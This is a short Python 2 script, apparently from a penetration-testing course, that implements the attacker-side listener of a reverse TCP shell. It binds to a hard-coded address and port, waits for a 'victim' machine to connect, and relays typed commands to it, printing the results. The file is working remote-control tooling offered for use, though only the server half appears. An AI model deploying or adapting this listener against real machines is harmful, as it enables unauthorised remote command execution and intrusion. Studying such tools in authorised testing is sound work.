# Reverse TCP Shell in Python For Offensive Security/Penetration Testing Assignments 
# Connect on LinkedIn  https://www.linkedin.com/in/lismore or Twitter @patricklismore
#=========================================================================================================================================

# Python TCP Server 

import socket

def startServer():
    
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)    # create a socket object 'sock'
    
    sock.bind(("192.168.1.95", 5000))                           # define the attack IP and port
    
    sock.listen(1)                                              # allow a single connection
    
    print '[+] Listening for an inbound TCP connection on port 5000'
    
    conn, addr = sock.accept()                                  # return a connection object, the attack IP address and source
    
    print '[+] Connection from: ', addr

    while True:
        
        victimcommand = raw_input("VictimShell> ")              # Get victims input command
        
        if 'terminate' in victimcommand:                        # If server recieves a terminate command then drop the connection
            conn.send('terminate')
            conn.close()
            break

        else:
            conn.send(victimcommand)                            # else send the command to the victim
            print conn.recv(1024)                               # print result
        
def main ():
    startServer()
main()











